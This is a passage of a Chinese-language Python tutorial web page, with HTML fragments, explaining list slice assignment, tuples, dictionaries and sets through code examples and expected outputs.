</textarea>修改列表元素:程序也可通过slice语法对列表其中一部分赋值。在执行这个操作时并不要求新赋值的元素个数与原来的元素个数相等,这意味着通过这种方式既可为列表增加元素,也可为列表删除元素<textarea>
# 对列表中间一段赋值:
b_list = list(range(1, 5))
print(b_list)
# 将第2个到第4个(不包含)元素赋值为新列表的元素
b_list[1: 3] = ['a', 'b']
print(b_list) # [1, 'a', 'b', 4]

# 如果对列表中空的slice赋值,就变成了为列表插入元素
# 将第3个到第3个(不包含)元素赋值为新列表的元素,就是插入
b_list[2: 2] = ['x', 'y']
print(b_list) # [1, 'a', 'x', 'y', 'b', 4]

# 如果将列表其中一段赋值为空列表,就变成了从列表中删除元素
# 将第3个到第6个(不包含)元素赋值为空列表,就是删除
b_list[2: 5] = []
print(b_list) # [1, 'a', 4]

# 对列表使用slice语法赋值时,不能使用单个值;如果使用字符串赋值,Python会自动把字符串当成序列处理,其中每个字符都是一个元素
b_list[1: 3] = 'Charlie'
print(b_list) # [1, 'C', 'h', 'a', 'r', 'l', 'i', 'e']

# 在使用slice语法赋值时,也可指定step参数。但如果指定了step参数,则要求所赋值的列表元素个数与所替换的列表元素个数相等
纯文本复制
c_list = list(range(1, 10))
# 指定step为2,被赋值的元素有4个,因此用于赋值的列表也必须有4个元素
c_list[2: 9: 2] = ['a', 'b', 'c', 'd']
print(c_list) # [1, 2, 'a', 4, 'b', 6, 'c', 8, 'd']

</textarea>
</div>

<div id="tuple">
<h4>Python元组tuple</h4><pre>
元组是另一个重要的序列结构,和列表类似,也是由一系列按特定顺序排序的元素组成。

列表可以任意操作修改删除元素,是可变序列mutable,通常列表中的元素一般是同种类型的,并且通过迭代访问
元组是不可变序列immutable,即元组中的元素不可以单独修改,除非将元组整体替换掉,元组可以看做是不可变的列表即只读列表,元组通常用于保存不可修改的内容,通常包含不同种类的元素,并且通过解包或索引来访问,namedtuples甚至还可以通过属性访问
因为tuple不可变,所以代码更安全,能用tuple代替list就尽量用tuple

tuple在定义的时候tuple的元素就必须被确定下来,tuple一旦初始化就不能修改,也没有append()、insert()这样的方法,其他获取元素的方法和list是一样的,可以正常地使用ctuple[0]、tuple[-1],但不能赋值成另外的元素
列表可以使用切片访问和修改列表中的元素;虽然元祖元素支持使用切片,但只能用于访问元素,而不能对元素做修改

元组的不可替代性体现在以下这些场景中:
1、元组作为很多内置函数和序列类型方法的返回值存在,也就是说在使用某些函数或方法时它的返回值会元组类型,因此必须对元组进行处理。
2、元组比列表的访问和处理速度更快,因此当需要对指定元素进行访问,且不涉及修改元素的操作时,建议使用元组。
3、元组可以在映射(和集合的成员)中当做"键"使用,而列表不行

【 元组创建 】
一个元组由几个被逗号隔开的值组成,可用()标识,元素个数没有限制,且只要是Python支持的数据类型就可以,可存储数值、字符串、元组或列表等可变对象等任何类型的数据,且在同一个元组中元素的类型可以不同
元组通常都是使用一对小括号将所有元素括起来的,但小括号不是必须的,只要将各元素用逗号隔开,Python就会将其视为元组

t = 123, 321, 'hello'
print(type(t), t)                # < class 'tuple'> (123, 321, 'hello')
print(t == (123, 321, 'hello'))  # True
n = t, (1, 2, 3, 4, 5)
print(type(n), n)                # < class 'tuple'> ((123, 321, 'hello'), (1, 2, 3, 4, 5))

tup1 = ()                        # 创建空元组
tuplename = ("c.biancheng.net", 1, [2, 'a'], ("abc", 3.0))
print(type(tuplename))           # < class 'tuple'>

任意无符号的对象,以逗号隔开,默认为元组
print('abc', -4.24e93, 18+6.6j, 'xyz')   # abc -4.24e+93 (18+6.6j) xyz
size = width, height = 320, 240          # 设置窗口大小
x, y = 1, 2
print(x,y)                               # 1 2

原地交换两个数字
赋值的右侧形成了一个新的元组,左侧立即解析unpack那个未被引用的元组到变量a和b,一旦赋值完成,新的元组变成了未被引用状态并且被标记为可被垃圾回收,最终也完成了变量的交换

</pre><textarea>
x,y= 10,20
print(x,y) # (10, 20)
x,y= y,x
print(x,y) # (20, 10)

def swap(a, b):
    return b, a
a, b = -1, 14
swap(a, b) # (14, -1)

</textarea><pre>
元组在输出时总是被圆括号包围的,以便正确表示嵌套元组,输入时圆括号可有可无,不过经常会是必须的
括号既可以表示tuple,又可以表示数学公式中的小括号,这就产生了歧义,因此Python规定这种情况下按小括号进行计算,计算结果自然是1
元组中只包含一个元素时需要在元素后面添加逗号来消除歧义,Python在显示只有1个元素的tuple时也会加一个逗号,以免误解成数学计算意义上的括号
t = (1)
print(t, type(t))   # 1 < class 'int'>
t = (1,)
print(t, type(t))   # (1,) < class 'tuple'>

empty = ()
singleton = 'hello',
print(len(empty))      # 0
print(len(singleton))  # 1
print(singleton)       # ('hello',)

tuple()函数也可创建元组,它可以直接将字符串、元组、range()函数创建的区间对象、列表等对象转换成元组
print(tuple(['crazyit', 20, -1.2]))   # ('crazyit', 20, -1.2)
print(tuple(range(5)))                # (0, 1, 2, 3, 4)

【 序列解包和解构赋值 】
t = 12345, 54321, 'hello!' # 元组打包的一个例子,值12345,54321和'hello!'被打包进元组,其逆操作也是允许的
x, y, z = t
这被称为序列解包,因为解包操作的等号右侧可以是任何序列。序列解包要求等号左侧的变量数与右侧序列里所含的元素数相同,可变参数其实也只是元组打包和序列解包的组合

S = 'STR'
a, b, c = S
print(a, b, c) # S T R

# 利用切片解决两边元素不相等的情形
S = 'PYTHON'
a, b, c = S[0], S[1], S[2:]
print(a, b, c) # P Y THON

# 嵌套赋值
S = 'PYTHON'
(a, b), c = S[:2], S[2:]
print((a, b), c) # ('P', 'Y') THON

对称性赋值:
对称性赋值在很多情况下被称为解构,其实只是解构的一小部分.
把线性结构(包括字典和list等)的元素解开,并顺序的赋值给其他变量,
左边接纳的变量数要和右边解开的元素个数一致,
通常用在x,y=y,x
相当于将y,x先封装为一个元组(y,x),等价于x,y=(y,x),然后依据位置参数进行依次赋值.

</pre>各个数据类型的解构<textarea>
a,b=1,2                # 序列赋值
print(a, b)            # 1 2

a,b=(1,2)              # 元祖赋值运算
print(a, b)            # 1 2

a,b=[1,2]              # 列表赋值运算
print(a, b)            # 1 2

[a, b, c] = ('A', 'B', 'C')  # 将元组中的值赋值给列表
print(a, b, c)         # A B C

a,b={1,2}
print(a, b)            # 1 2

dic={'a':1,'b':2}
a,b={'a':1,'b':2}
print(a, b)            # a b
print(dic[a], dic[b])  # 1 2

a,*b=(1,2,3)
print(a, b)            # 1 [2,3]

*a,b=(1,2,3)
print(a, b)            # [1,2] 3

a,*b,c=(1,2,3,4,5,6,7,8)
print(a, b , c)        # 1 [2, 3, 4, 5, 6, 7] 8

*a,b,c=(1,2,3,4,5,6,7,8)
print(a, b , c)        # [1, 2, 3, 4, 5, 6] 7 8

</textarea><pre>
封装:
将多个值使用逗号分割组合在一起,本质上返回一个元组,只是省略了小括号

</pre><textarea>
lst = [1]
lst2 = [2]
print(lst, lst2, 3)   # 输出:[1] [2] 3
print(*[1], *[2], 3)  # 输出:1 2 3
print(dict(**{"x": 1}, y=2, **{"z": 3}))  # 输出:{'x': 1, 'y': 2, 'z': 3}
a = *range(4),        # 必须要有逗号,逗号后面还可以跟数字,
print(a)              # 输出:(0, 1, 2, 3)
b = [*range(4)]       # 可以加逗号,也可以不加逗号,输出:[0, 1, 2, 3]
b1 = [*range(4), 8]   # 输出:[0, 1, 2, 3, 8]
c = {*range(4)}       # 可以加逗号,或者不加,set集合,输出:{0, 1, 2, 3}

d={'x':1,**{'y':2,'z':3}}  #dict
print(d)              # 输出:{'x': 1, 'y': 2, 'z': 3}

</textarea><pre>

</pre><pre>
【 修改元组元素 】
元组是不可变序列,元组中的元素不可以单独进行修改,但元组也不是完全不能修改

t = ('a', 'b', ['A', 'B'])
t[0] = 100    # TypeError: 'tuple' object does not support item assignment

可变的tuple
t = ('a', 'b', ['A', 'B'])   # 这个tuple定义的时候有3个元素,分别是'a','b'和一个list
t[2][0] = 'X'
t[2][1] = 'Y'
print(t)      # ('a', 'b', ['X', 'Y'])

表面上看示例中tuple的元素确实变了,但其实变的不是tuple的元素,而是list的元素。tuple一开始指向的list并没有改成别的list,所以tuple所谓的"不变"是说tuple的每个元素指向永远不变,即指向'a'就不能改成指向'b',指向一个list就不能改成指向其他对象,但指向的这个list本身是可变的

对元组重新赋值:
a_tuple = ('crazyit', 20, -1.2)
a_tuple = ('c.biancheng.net',"C语言中文网")
print(a_tuple)  # ('c.biancheng.net', 'C语言中文网')

还可以通过连接多个元组的方式向元组中添加新元素,元组连接的内容必须都是元组,不能将元组和字符串或列表进行连接,否则抛出TypeError错误
a_tuple = ('crazyit', 20, -1.2)
# 连接多个元组,创建一个新的元组
a_tuple = a_tuple + ('c.biancheng.net',)
print(a_tuple)  # ('crazyit', 20, -1.2, 'c.biancheng.net')
# 元组连接字符串
a_tuple = a_tuple + 'c.biancheng.net'
print(a_tuple)  # TypeError: can only concatenate tuple (not "str") to tuple

【 Python删除元组 】
当已经创建的元组确定不再使用时,可以使用del语句将整个元组删除

a_tuple = ('crazyit', 20, -1.2)
del(a_tuple)
print(a_tuple)   # NameError: name 'a_tuple' is not defined

</pre><textarea>
#!/usr/bin/python
# -*- coding: UTF-8 -*-

tuple = ( 'runoob', 786 , 2.23, 'john', 70.2 )
tinytuple = (123, 'john')

print(type(tuple))         # < class 'tuple'>
print(len(tuple))          # 5
print(tuple)               # 输出完整元组
print(tuple[0])            # 输出元组的第一个元素
print(tuple[1:3])          # 输出第二个至第四个(不包含)的元素,输出(786, 2.23)
print(tuple[0:3])          # 输出('runoob', 786 , 2.23)
print(tuple[:3])           # 简写输出('runoob', 786 , 2.23)
print(tuple[2:])           # 输出从第三个开始至列表末尾的所有元素
print(tinytuple * 2)       # 输出元组两次,(123, 'john', 123, 'john')
print(tuple + tinytuple)   # 打印组合的元组,('runoob', 786, 2.23, 'john', 70.2, 123, 'john')

# 元素是否存在
print(3 in tinytuple)         # false
for x in (1, 2, 3): print(x), # 1 2 3

</textarea><pre>
【 元祖内置函数 】
cmp(tuple1, tuple2)
比较两个元组元素。

len(tuple)
计算元组元素个数。

max(tuple)
返回元组中元素最大值。

min(tuple)
返回元组中元素最小值。

tuple(seq)
将列表转换为元组。

</pre>
</div>

<div id="dictionary">
<h4>Python字典(dictionary)</h4><pre>
字典类型是Python中唯一的映射类型
和列表相同,字典也是许多数据的集合,属于可变序列类型,可存储任意类型对象且可任意嵌套,是除列表以外最灵活的内置数据结构类型,其他语言称map
不同之处在于,列表是有序的对象集合,字典是无序的可变序列,其保存的内容是以"键值对"(key-value)的形式存放的,具有极快的查找速度
两者之间的区别在于:字典当中的元素是通过键来存取的,而不是通过偏移/索引存取

和list比较,dict有以下几个特点:
查找和插入的速度极快,不会随着key的增加而变慢;
需要占用大量的内存,内存浪费多。

而list相反:
查找和插入的时间随着元素的增加而增加;
占用空间小,浪费内存很少。
所以dict是用空间来换取时间的一种方法

字典的每个键值key=>value对用冒号分割,每个键值对之间用逗号分割,整个字典包括在花括号{}中,这也是字典输出的方式
d = {key1 : value1, key2 : value2 }

与以连续整数为索引的序列不同,字典是以关键字为索引的,关键字可以是任意不可变类型,通常是字符串或数字
如果一个元组只包含字符串、数字或元组,那么这个元组也可以用作关键字,但如果元组直接或间接地包含了可变对象,那么它就不能用作关键字。列表不能用作关键字,因为列表可以通过索引、切片或append()和extend()之类的方法来改变

dict在保存时根据key来计算出一个内存地址,然后将key-value保存在这个地址中,这种算法被成为hash算法,在dict中存储的key-value中的key必须是可hash的,可以改变的都是不可哈希的,可哈希就意味着不可变,这个是为了能准确的计算内存地址而规定的

已知可哈希(不可变)的数据类型:int,str,tuple,bool
不可哈希(可变)的数据类型:list,dict,set

dict保存的数据不是按照添加进去的顺序保存的,是按照hash表的顺序保存的,而hash表不是连续的,字典中元素是无序的,所以不能进行切片工作一次性访问多个元素,它只能通过key来获取dict中的数据

键必须是唯一的,如果重复则最后的一个键值对会替换前面的,键必须不可变,只能使用数字、字符串或元组,不能使用列表
值不需要唯一,可以取任何数据类型,值可以没有限制地取任何python对象,既可以是标准的对象,也可以是用户定义的

Python3.5-字典是不能保证顺序的,键值对A先插入字典,键值对B后插入字典,但打印字典的Keys列表时B可能在A的前面。
Python3.6+字典是变成有顺序的了,先插入键值对A,后插入键值对B,打印Keys列表时B在A的后面

</pre><textarea>
dict = {}
dict['Name'] = "Zara"       # 字典添加键值对
dict['Age'] = 7             # 添加
dict['Class'] = "First"     # 添加
dict[2] = "This is two"     # 添加
print(type(dict))           # < class 'dict'>

# dict是通过键来访问对应的元素值的
print(dict['Name'])     # 输出键为'Name'的值
print(dict[2])          # 输出键为2的值
print(dict)             # {'Name': 'Zara', 'Age': 7, 'Class': 'First', 2: 'This is two'}

print(dict.keys())      # 输出所有键,dict_keys(['Name', 'Age', 'Class', 2])
print(dict.values())    # 输出所有值,dict_values(['Zara', 7, 'First', 'This is two'])
print(dict.items())     # 将键和值同时取出,dict_items([('Name','Zara'),('Age',7),('Class','First'),(2,'This is two')])
for k, v in dict.items(): print(k, v)

dict['Age'] = 8         # 更新修改
print(dict['Age'])      # 8

print(dict['Weight'])           # key不存在报错KeyError,两种解决办法:通过in判断;通过get方法如果key不存在可返回None或指定的value
print('Weight' in dict)         # False
print(dict.get('Weight'))       # None,返回None的时候Python的交互环境不显示结果
print(dict.get('Weight', 'unkown'))  # unkown

del dict['Name']            # 删除键是'Name'的条目
print(dict)                 # {'Age': 8, 'Class': 'First', 2: 'This is two'}

dict.pop('Age')             # 删除键是'Age'的条目
print(dict)                 # {'Class': 'First', 2: 'This is two'}

dict.clear()                # 清空字典所有条目
print(dict)                 # {}

del dict                    # 删除字典
print(dict['Name'])         # 引发一个异常:TypeError: 'type' object is not subscriptable,因为用del后字典不再存在

dict = {'a': 1, 'b': 2, 'b': '3', 98.6: 37, 'Alice': '2341', 'Beth': '9102', 'Cecil': '3258', '备注': '混合数据类型'}
print(dict['b'])            # '3'
print(dict)                 # {'a':1,'b':'3','Alice':'2341',98.6:37,'Beth':'9102','Cecil':'3258','备注':'混合数据类型'}
print('备注' in a)          # True

# 使用元组作为dict的key
dict2 = {(20, 30):'good', 30:[1,2,3]}
print(dict2)                # {(20, 30): 'good', 30: [1, 2, 3]}

</textarea>dict()构造函数可直接从键值对序列里创建字典,无论采用哪种方式创建字典,字典中各元素的键都只能是字符串、元组或数字,不能是列表<textarea>
# 字典推导式可以从任意的键值表达式中创建字典
print({x: x**2 for x in (2, 4, 6)}) # {2: 4, 4: 16, 6: 36}
print({i:i+2 for i in range(5)})    # {0: 2, 1: 3, 2: 4, 3: 5, 4: 6}

# 如果不为dict()函数传入任何参数,则代表创建一个空的字典
d = dict()
print(d)      # {}

# 键是简单字符串时可直接通过关键字参数来指定键值对,其中的one、two、three都是字符串,但使用此方式创建字典时字符串不能带引号
a = dict(one=1,two=2,three=3)

# 向dict()函数传入列表或元组,而它们中的元素又各自是包含2个元素的列表或元组,其中第一个元素作为键,第二个元素作为值。
demo = [('two',2),('one',1),('three',3)]
demo = [['two',2],['one',1],['three',3]]
demo = (('two',2),('one',1),('three',3))
demo = (['two',2],['one',1],['three',3])
a = dict(demo)

# 通过应用dict()函数和zip()函数,可将前两个列表转换为对应的字典
demokeys = ['one','two','three']    # 还可以是字符串或元组
demovalues = [1,2,3]                # 还可以是字符串或元组
print(zip(demokeys,demovalues))     # < zip object at 0x7f2f39edec88>
a = dict(zip(demokeys,demovalues))
print(a)                            # {'one': 1, 'two': 2, 'three': 3}

</textarea>对一个字典执行list(d)将返回包含该字典中所有键的列表,按插入次序排列,如需其他排序则要使用sorted(d)<textarea>
d = {'jack': 4098, 'guido': 4127, 'irv': 4127}
print(list(d))           # ['jack', 'guido', 'irv']
print(sorted(d))         # ['guido', 'irv', 'jack']

</textarea>字典的嵌套<textarea>
wangfeng = {
    'name':'wf',
    'age':46,
    'wife':{
        'name':'zzy',
        'age':43
    },
    'children':[
        {'name':'小叮当','age':10},
        {'name':'大叮当','age':16}
    ]
}
print(wangfeng.get("children")[1].get("age"))
print(wangfeng.get("wife").get("name"))
print(wangfeng.get("name"))

</textarea><pre>
【 使用字典格式化字符串 】
在格式化字符串时,如果要格式化的字符串模板中包含多个变量,后面就需要按顺序给出多个变量,这种方式对于字符串模板中包含少量变量的情形是合适的,但如果字符串模板中包含大量变量,这种按顺序提供变量的方式则有些不合适。
这时就可以使用字典对字符串进行格式化输出,具体方法是:在字符串模板中按 key 指定变量,然后通过字典为字符串模板中的 key 设置值。

</pre><textarea>
# 字符串模板中使用key
temp = '教程是:%(name)s, 价格是:%(price)010.2f, 出版社是:%(publish)s'
book = {'name':'Python基础教程', 'price': 99, 'publish': 'C语言中文网'}
# 使用字典为字符串模板中的key传入值
print(temp % book)   # 教程是:Python基础教程, 价格是:0000099.00, 出版社是:C语言中文网

book = {'name':'C语言小白变怪兽', 'price':159, 'publish': 'C语言中文网'}
# 使用字典为字符串模板中的key传入值
print(temp % book)   # 教程是:C语言小白变怪兽, 价格是:0000159.00, 出版社是:C语言中文网

</textarea><pre>
【 Python字典内置函数 】
cmp(dict1, dict2): 比较两个字典元素。
len(dict): 计算字典元素个数,即键的总数。
str(dict): 输出字典可打印的字符串表示。
type(variable): 返回输入的变量类型,如果变量是字典就返回字典类型

【 Python字典包含了以下内置方法 】
print([e for e in dir(dict) if not e.startswith('_')])
# ['clear', 'copy', 'fromkeys', 'get', 'items', 'keys', 'pop', 'popitem', 'setdefault', 'update', 'values']

dict.setdefault(key, default=None)
和get()类似,但如果键不存在于字典中,将会添加键并将值设为default,然后再返回该key对应的value
setdefault()方法总能返回指定key对应的value;如果该键值对存在则直接返回该key对应的value;如果该键值对不存在则先为该key设置默认的value,然后再返回该key对应的value。

</pre><textarea>
a = {'one': 1, 'two': 2, 'three': 3}
# 设置默认值,该key在dict中不存在,新增键值对
print(a.setdefault('four', 9.2))  # 9.2
print(a)                          # {'one': 1, 'two': 2, 'three': 3, 'four': 9.2}
# 设置默认值,该key在dict中存在,不会修改dict内容
print(a.setdefault('one', 3.4))   # 1
print(a)                          # {'one': 1, 'two': 2, 'three': 3, 'four': 9.2}

</textarea><pre>
dict.copy()
返回一个具有相同键值对的新字典

</pre><textarea>
a = {'one': 1, 'two': 2, 'three': [1,2,3]}
b = a.copy()
print(b)      # {'one': 1, 'two': 2, 'three': [1, 2, 3]}

</textarea><pre>
copy()方法所遵循的拷贝原理,既有深拷贝,也有浅拷贝。拿拷贝字典a为例,copy()方法只会对最表层的键值对进行深拷贝,也就是说它会再申请一块内存用来存放{'one': 1, 'two': 2, 'three': []};而对于某些列表类型的值来说,此方法对其做的是浅拷贝,也就是说b中的[1,2,3]的值不是自己独有,而是和a共有

</pre><textarea>
a = {'one': 1, 'two': 2, 'three': [1,2,3]}
b = a.copy()
# 向a中添加新键值对,由于b已经提前将a所有键值对都深拷贝过来,因此a添加新键值对,不会影响b
a['four']=100
print(a)        # {'one': 1, 'two': 2, 'three': [1, 2, 3], 'four': 100}
print(b)        # {'one': 1, 'two': 2, 'three': [1, 2, 3]}

# 由于b和a共享[1,2,3](浅拷贝),因此移除a中列表中的元素,也会影响b
a['three'].remove(1)
print(a)        # {'one': 1, 'two': 2, 'three': [2, 3], 'four': 100}
print(b)        # {'one': 1, 'two': 2, 'three': [2, 3]}

</textarea><pre>
dict.fromkeys(seq[, val=None])
创建一个新字典,以序列seq中元素做字典的键,val为字典所有键对应的初始值,默认创建所有键值为空的字典,通常用于初始化字典,设置value的默认值

</pre><textarea>
knowledge = {'语文', '数学', '英语'}
scores = dict.fromkeys(knowledge)
print(scores)   # {'语文': None, '数学': None, '英语': None}

</textarea><pre>
dict.get(key, default=None)
返回指定键的值,如果值不在字典中返回default值

dict.has_key(key)
如果键在字典dict里返回true,否则返回false

dict.items()
以列表返回可遍历的(键, 值) 元组数组

dict.keys()
以列表返回一个字典所有的键

dict.values()
以列表返回字典中的所有值

</pre><textarea>
a = {'数学': 95, '语文': 89, '英语': 90}
print(a.keys())    # dict_keys(['数学', '语文', '英语'])
print(a.values())  # dict_values([95, 89, 90])
print(a.items())   # dict_items([('数学', 95), ('语文', 89), ('英语', 90)])

# 这三个方法的返回值并不是常见的列表和元组类型,因为Python3不希望用户直接操作这几个方法的返回值。如果想使用返回的数据有以下2种方法
# 使用list()函数将它们返回的数据转换成列表
b = list(a.keys())
print(b)           # ['数学', '语文', '英语']

# 也可以利用多重赋值的技巧,利用循环结构将键或值分别赋给不同的变量
for k in a.keys(): print(k,end=' ')
print("\n---------------")
for v in a.values(): print(v,end=' ')
print("\n---------------")
for k,v in a.items(): print("key:",k," value:",v)

# 输出
数学 语文 英语
---------------
95 89 90
---------------
key: 数学  value: 95
key: 语文  value: 89
key: 英语  value: 90

</textarea><pre>
dict.clear()
删除字典内所有元素

dict.pop(key[,default])
删除字典给定键key所对应的值,返回值为被删除的值。key值必须给出,否则返回default值。

</pre><textarea>
a = {'one': 1, 'two': 2, 'three': 3}
print(a.pop('one'))   # 1
print(a)              # {'two': 2, 'three': 3}
print(a.pop('one', 'first'))   # first
print(a)              # {'two': 2, 'three': 3}

</textarea><pre>
dict.popitem()
随机返回并删除字典中的一个键值对,此处的随机其实是假的,它和list.pop()方法一样也是弹出字典中最后一个键值对,但由于字典存储键值对的顺序是不可知的,因此popitem()方法总是弹出底层存储的最后一个键值对

</pre><textarea>
a = {'one': 1, 'two': 2, 'three': 3}
# 弹出字典底层存储的最后一个键值对
print(a.popitem())  # ('three', 3)
print(a)            # {'one': 1, 'two': 2}

# 由于popitem弹出的是一个元组,因此也可以通过序列解包的方式,用两个变量分别接收key和value
k, v = a.popitem()
print(k, v)         # two 2

</textarea><pre>
dict.update(dict2)
把字典dict2的键/值对更新到dict里,如果被更新的字典中己包含对应的键值对则原value会被覆盖;如果被更新的字典中不包含对应的键值对则该键值对被添加进去

</pre><textarea>
a = {'one': 1, 'two': 2, 'three': 3}
a.update({'one':4.5, 'four': 9.3})
print(a)   # {'one': 4.5, 'two': 2, 'three': 3, 'four': 9.3}

# update的几种用法:
d1={'aa':100}
d1.update({'bb':200})
d1.update(cc=200)
d1.update([("dd",200)])
d1.setdefault('ee','200')
print(d1)   #{'aa': 100, 'bb': 200, 'cc': 200, 'dd': 200, 'ee': '200'}

</textarea>
</div>

<div id="set">
<h4>set集合</h4><pre>
集合是由不重复元素组成的无序的集,即集合中的元素都是唯一的,互不相同,它的基本用法包括成员检测和消除重复元素,集合对象也支持像联合,交集,差集,对称差分等数学运算

从形式上看,和字典类似,Python集合会将所有元素放在一对大括号{}中,相邻元素之间用","分隔{element1,element2,...,elementn}
从内容上看,同一集合中只能存储不可变的数据类型,包括数字、字符串、元组或布尔类型True或False,无法存储列表、字典、集合这些可变的数据类型,否则Python解释器会抛出TypeError错误
set和dict的唯一区别仅在于没有存储对应的value,但set的原理和dict一样,所以同样不可以放入可变对象,因为无法判断两个可变对象是否相等,也就无法保证set内部"不会有重复元素"。

Python中有两种集合类型,一种是set类型的集合,另一种是frozenset类型的集合,它们唯一的区别是,set类型集合可以做添加、删除元素的操作,而forzenset类型集合不行
set集合是可变容器,程序可以改变容器中的元素。与set对应的还有frozenset集合,frozenset是set的不可变版本,它的元素是不可变的

花括号或python内置函数set()可以用来创建set集合
set()功能是将字符串、列表、元组、range对象等可迭代对象转换成集合
如果要创建空集合,只能使用set()函数实现,因为直接使用一对{},Python解释器会将其视为一个空字典

set1 = set("c.biancheng.net")
set2 = set([1,2,3,4,5])
set3 = set((1,2,3,4,5))
print(set1)             # {'a', 'g', 'b', 'c', 'n', 'h', '.', 't', 'i', 'e'}
print(set2)             # {1, 2, 3, 4, 5}
print(set3)             # {1, 2, 3, 4, 5}
print(type(set1))       # < class 'set'>
print('c' in set1)      # True

重复元素在set中自动被过滤:
s = set([1, 1, 2, 2, 3, 3])
print(s)      # {1, 2, 3}

去除重复的字母是处理文本时的常见操作
s = 'aaabbccddddef'
print(''.join(set(s))) # abfdce,返回的是随机顺序的字符串

元素重复性检查
a = [1,2,3,5,2,3]
print(len(a) == len(set(a))) # False

【 访问set集合元素 】
由于Python中的set集合是无序的,所以每次输出时元素的排序顺序可能都不相同
print({1,2,1,(1,2,3),'c','c'})  # {1, 2, 'c', (1, 2, 3)}

由于集合元素无序,因此无法像列表使用下标访问元素,访问集合元素最常用的方法是使用循环结构,将集合中的数据逐一读取出来
for ele in {1,'c',1,(1,2,3),'c'}: print(ele,end=' ')  #1 c (1, 2, 3)

</pre><pre>
【 set集合方法 】
print([e for e in dir(set) if not e.startswith('_')])
# ['add', 'clear', 'copy', 'difference', 'difference_update', 'discard', 'intersection', 'intersection_update', 'isdisjoint', 'issubset', 'issuperset', 'pop', 'remove', 'symmetric_difference', 'symmetric_difference_update', 'union', 'update']

add()
set1.add(elem)
向set1集合中添加数字、字符串、元组或布尔类型,可以重复添加,但不会有效果
set1 = {1,2,3}
set1.add((1,2))
print(set1)  # {(1, 2), 1, 2, 3}

s.add(4)
print(s)      # {1, 2, 3, 4}
s.add(4)
print(s)      # {1, 2, 3, 4}

clear()
set1.clear()
清空set1集合中所有元素
set1 = {1,2,3}
set1.clear()
print(set1)  # set(),set()才表示空集合,{}表示的是空字典

使用del()语句删除set集合
del(s)
print(s)      # NameError: name 'a' is not defined

copy()
set2 = set1.copy()
拷贝set1集合给set2
set1 = {1,2,3}
set2 = set1.copy()
set1.add(4)
print(set1)  # {1, 2, 3, 4}
print(set2)  # {1, 2, 3}

pop()
a = set1.pop()
取set1中一个元素并赋值给a
set1 = {1,2,3}
a = set1.pop()
print(set1) # {2,3}
print(a)    # 1

remove()
set1.remove(elem)
移除set1中的elem元素
set1 = {1,2,3}
set1.remove(2)
print(set1)    # {1, 3}
set1.remove(4) # KeyError: 4

通过remove(key)方法可以删除元素,如果被删除元素本就不包含在集合中则此方法会抛出KeyError错误
s.remove(4)
print(s)      # {1, 2, 3}
s.remove(4)   # KeyError: 4

如果不想在删除失败时令解释器提示KeyError错误可以使用in运算符或discard()方法,此方法和remove()方法的用法相同,唯一的区别是当删除集合中元素失败时不会抛出任何错误
s.discard(4)
print(s)      # {1, 2, 3}

discard()
set1.discard(elem)
删除set1中的elem元素,当删除集合中元素失败时不会抛出任何错误
set1 = {1,2,3}
set1.discard(2)
print(set1) # {1, 3}
set1.discard(4)
print(set1) # {1, 3}

intersection()
set3 = set1.intersection(set2)
取set1和set2的交集给set3
set1 = {1,2,3}
set2 = {3,4}
set3 = set1.intersection(set2)
print(set3) # {3}

intersection_update()
set1.intersection_update(set2)
取set1和set2的交集并更新给set1
set1 = {1,2,3}
set2 = {3,4}
set1.intersection_update(set2)
print(set1) # {3}

isdisjoint()
set1.isdisjoint(set2)
判断set1和set2是否没有交集,有交集返回False;没有交集返回True
set1 = {1,2,3}
set2 = {3,4}
print(set1.isdisjoint(set2)) # False

issubset()
set1.issubset(set2)
判断set1是否是set2的子集
set1 = {1,2,3}
set2 = {1,2}
print(set1.issubset(set2)) # False

issuperset()
set1.issuperset(set2)
判断set2是否是set1的子集
set1 = {1,2,3}
set2 = {1,2}
print(set1.issuperset(set2))  # True

difference()
set3 = set1.difference(set2)
将set1中有而set2没有的元素给set3
set1 = {1,2,3}
set2 = {3,4}
set3 = set1.difference(set2)
print(set3) # {1, 2}

difference_update()
set1.difference_update(set2)
从set1中删除与set2相同的元素
set1 = {1,2,3}
set2 = {3,4}
set1.difference_update(set2)
print(set1) # {1, 2}

symmetric_difference()
set3 = set1.symmetric_difference(set2)
取set1和set2中互不相同的元素给set3
set1 = {1,2,3}
set2 = {3,4}
set3 = set1.symmetric_difference(set2)
print(set3) # {1, 2, 4}

symmetric_difference_update()
set1.symmetric_difference_update(set2)
取set1和set2中互不相同的元素,并更新给set1
set1 = {1,2,3}
set2 = {3,4}
set1.symmetric_difference_update(set2)
print(set1)  # {1, 2, 4}

union()
set3 = set1.union(set2)
取set1和set2的并集赋给set3
set1 = {1,2,3}
set2 = {3,4}
set3 = set1.union(set2)
print(set3)    # {1, 2, 3, 4}
set3 = set1.union([5,6])
print(set3)    # {1, 2, 3, 5, 6}

update()
set1.update(iterable)
添加iterable列表或集合中的元素到set1
set1 = {1,2,3}
set2 = {3, 4}
set1.update(set2)
print(set1)   # {1, 2, 3, 4}
set1.update([5,6])
print(set1)   # {1, 2, 3, 4, 5, 6}

【 set集合运算:交集、并集、差集及对称差集运算 】
set可以看成数学意义上的无序和无重复元素的集合,因此两个set可以做数学意义上的交集、并集等操作

</pre><textarea>
set0 = {1}
set1={1,2,3}
set2={3,4,5}

交集:取两集合公共的元素
print(set1 & set2)  # {3}

并集:取两集合全部的元素
print(set1 | set2)  # {1,2,3,4,5}

差集:取一个集合中另一集合没有的元素
print(set1 - set2)  # {1,2}
print(set2 - set1)  # {4,5}

对称差集:取集合A和B中不属于A&B的元素,即并集减交集
print(set1 ^ set2)  # {1,2,4,5}

</textarea><pre>
set集合支持的如下几个运算符:
<=:相当于调用issubset()方法,判断前面的set集合是否为后面的set集合的子集合
>=:相当于调用issuperset()方法,判断前面的set集合是否为后面的set集合的父集合
&:相当于调用intersection()方法,用于获取两个set集舍的交集
-:相当于调用difference()方法,用前面的set集合减去后面的set集合的元素
^:计算两个集合异或的结果,就是用两个集合的并集减去交集的元素

set集合本身可变,因此除了add()、remove()、discard()方法来操作单个元素,还支持进行集合运算来改变集合内的元素,因此它的集合运算方法都有两个版本:
交集运算:intersection()和intersection_update(),前者不改变集合本身,而是返回两个集合的交集;后者会通过交集运算改变第一个集合。
并集运算:union()和update(),前者不改变集合本身,而是返回两个集合的并集;后者会通过并集运算改变第一个集合。
减法运算:difference()和difference_update(),前者不改变集合本身,而是返回两个集合做咸法的结果;后者改变第一个集合

</pre><textarea>
# 使用花括号构建set集合
c = {'白骨精'}

# 添加元素
c.add("孙悟空")
c.add(6)
print(len(c)) # 输出3

